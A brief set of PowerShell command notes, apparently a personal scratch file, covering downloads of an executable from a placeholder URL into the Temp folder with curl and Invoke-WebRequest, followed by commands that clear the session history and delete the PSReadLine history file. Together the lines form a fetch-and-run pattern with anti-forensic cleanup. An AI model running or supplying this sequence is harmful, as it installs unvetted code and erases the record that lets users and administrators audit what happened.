curl -L -o $env:TEMP\installer.exe https://site/installer.exe

C:\Users\<nome>\AppData\Local\Temp\installer.exe


iwr "site" -OutFile name.exe



Clear-History; Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
